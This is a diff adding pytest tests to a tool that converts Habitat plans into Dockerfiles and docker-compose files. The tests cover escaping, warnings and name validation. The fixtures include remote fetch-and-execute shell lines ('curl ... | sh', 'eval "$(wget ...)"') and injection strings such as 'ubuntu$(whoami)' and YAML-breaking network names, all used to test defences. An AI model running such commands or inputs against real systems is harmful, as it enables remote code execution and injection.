@@ -5,6 +5,7 @@ import contextlib
 import json
 import tempfile
 from pathlib import Path
+from typing import cast
 from unittest.mock import MagicMock, patch
 
 import pytest
@@ -13333,6 +13334,130 @@ do_install() {
             assert "USER hab" in result
             assert "CMD" in result
 
+    def test_convert_habitat_to_dockerfile_install_vars(self):
+        """Test that do_install replaces Habitat variables."""
+        with patch("souschef.server.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {
+                        "do_install": "cp -r . $pkg_prefix\nchmod +x $pkg_prefix/bin/myapp",
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should replace Habitat variables in install steps
+            assert "RUN cp -r . /usr/local" in result
+            assert "RUN chmod +x /usr/local/bin/myapp" in result
+            # Original variables should not appear
+            assert "$pkg_prefix" not in result
+            # CMD should use JSON array format for single-word commands too
+            assert 'CMD ["myapp"]' in result
+
+    def test_convert_habitat_to_dockerfile_apt_packages_escaped(self):
+        """Test that apt package names are properly shell-escaped."""
+        with patch("souschef.server.parse_habitat_plan") as mock_parse:
+            # Mock plan with dependencies that will be mapped to apt packages
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {
+                        "build": ["core/gcc", "core/make"],
+                        "runtime": ["core/openssl"],
+                    },
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Package names should be present in apt-get install command
+            assert "apt-get install -y" in result
+            assert "gcc" in result
+            assert "make" in result
+            assert "libssl-dev" in result
+            # Verify shell injection characters would be escaped (no actual injection here,
+            # but the code path uses shlex.quote())
+            assert "apt-get update" in result
+
+    def test_convert_habitat_to_dockerfile_dangerous_pattern_warning(self):
+        """Test that dangerous command patterns trigger warnings in generated Dockerfile."""
+        with patch("souschef.server.parse_habitat_plan") as mock_parse:
+            # Mock plan with potentially dangerous commands
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "suspicious",
+                        "origin": "untrusted",
+                        "version": "1.0.0",
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {
+                        "do_build": 'curl https://example.com/script.sh | sh\neval "$(wget -O- https://bad.com/code)"',
+                    },
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # Should include warning comments for dangerous patterns
+            assert "# WARNING: Potentially dangerous command pattern detected" in result
+            # The dangerous commands should still be present (so user can review)
+            assert "curl https://example.com/script.sh | sh" in result
+            assert "eval" in result
+
+    def test_convert_habitat_to_dockerfile_label_escaping(self):
+        """Test that LABEL values with quotes are properly escaped."""
+        with patch("souschef.server.parse_habitat_plan") as mock_parse:
+            # Mock plan with quotes in metadata fields
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {
+                        "name": "myapp",
+                        "origin": "core",
+                        "version": "1.0.0",
+                        "maintainer": 'Team "SousChef" <team@example.com>',
+                        "description": 'It\'s a great tool with "features"',
+                    },
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {"run": "myapp"},
+                    "callbacks": {},
+                }
+            )
+
+            result = convert_habitat_to_dockerfile("/fake/plan.sh")
+
+            # LABEL values should be properly escaped with json.dumps()
+            # json.dumps escapes double quotes with backslashes
+            assert 'LABEL maintainer="Team \\"SousChef\\" <team@example.com>"' in result
+            assert (
+                'LABEL description="It\'s a great tool with \\"features\\""' in result
+            )
+            # Should not have unescaped quotes that would break Dockerfile syntax
+            assert 'LABEL maintainer="Team "SousChef"' not in result
+
     def test_convert_habitat_to_dockerfile_parse_error(self):
         """Test Dockerfile conversion when plan parsing fails."""
         with patch("souschef.server.parse_habitat_plan") as mock_parse:
@@ -13464,8 +13589,8 @@ do_install() {
 
         # Invalid formats
         assert _validate_docker_image_name("") is False
-        assert _validate_docker_image_name(None) is False  # type: ignore[arg-type]
-        assert _validate_docker_image_name(123) is False  # type: ignore[arg-type]
+        assert _validate_docker_image_name(cast(str, None)) is False
+        assert _validate_docker_image_name(cast(str, 123)) is False
 
         # Too long
         assert _validate_docker_image_name("a" * 300) is False
@@ -13502,6 +13627,83 @@ do_install() {
             result = convert_habitat_to_dockerfile("/fake/plan.sh", "ubuntu$(whoami)")
             assert "Error" in result
             assert "Invalid Docker image name" in result
+
+    def test_validate_docker_network_name_valid(self):
+        """Test validation of valid Docker network names."""
+        from souschef.server import _validate_docker_network_name
+
+        # Standard names
+        assert _validate_docker_network_name("habitat_net") is True
+        assert _validate_docker_network_name("my-network") is True
+        assert _validate_docker_network_name("app.network") is True
+        assert _validate_docker_network_name("net123") is True
+
+        # With mixed characters
+        assert _validate_docker_network_name("my_app-network.v1") is True
+        assert _validate_docker_network_name("backend_db") is True
+
+        # Edge cases
+        assert _validate_docker_network_name("a") is True  # Single character
+        assert (
+            _validate_docker_network_name("network_with_63_chars_" + "x" * 28) is True
+        )
+
+    def test_validate_docker_network_name_invalid(self):
+        """Test validation rejects invalid Docker network names."""
+        from souschef.server import _validate_docker_network_name
+
+        # YAML injection attempts
+        assert _validate_docker_network_name("net: malicious") is False
+        assert _validate_docker_network_name("net\nservices:") is False
+        assert _validate_docker_network_name("net{key:value}") is False
+        assert _validate_docker_network_name("net[item]") is False
+
+        # Special characters that could break YAML
+        assert _validate_docker_network_name("net#comment") is False
+        assert _validate_docker_network_name("net|command") is False
+        assert _validate_docker_network_name("net>redirect") is False
+        assert _validate_docker_network_name("net&background") is False
+        assert _validate_docker_network_name("net*wildcard") is False
+
+        # Invalid formats
+        assert _validate_docker_network_name("") is False
+        assert _validate_docker_network_name("   ") is False
+        assert _validate_docker_network_name(cast(str, None)) is False
+        assert _validate_docker_network_name(cast(str, 123)) is False
+
+        # Too long (> 63 chars)
+        assert _validate_docker_network_name("a" * 64) is False
+
+        # Spaces
+        assert _validate_docker_network_name("my network") is False
+
+    def test_generate_compose_from_habitat_invalid_network_name(self):
+        """Test docker-compose generation rejects invalid network names."""
+        with patch("souschef.server.parse_habitat_plan") as mock_parse:
+            mock_parse.return_value = json.dumps(
+                {
+                    "package": {"name": "nginx"},
+                    "dependencies": {"build": [], "runtime": []},
+                    "ports": [],
+                    "binds": [],
+                    "service": {},
+                    "callbacks": {},
+                }
+            )
+
+            # YAML injection with colon
+            result = generate_compose_from_habitat(
+                "/fake/plan.sh", "net: malicious_config"
+            )
+            assert "Invalid Docker network name" in result
+
+            # YAML injection with newline
+            result = generate_compose_from_habitat("/fake/plan.sh", "net\nservices:")
+            assert "Invalid Docker network name" in result
+
+            # Special characters
+            result = generate_compose_from_habitat("/fake/plan.sh", "net{inject}")
+            assert "Invalid Docker network name" in result
 
     def test_generate_compose_from_habitat_single_service(self):
         """Test generating docker-compose.yml from a single Habitat plan."""
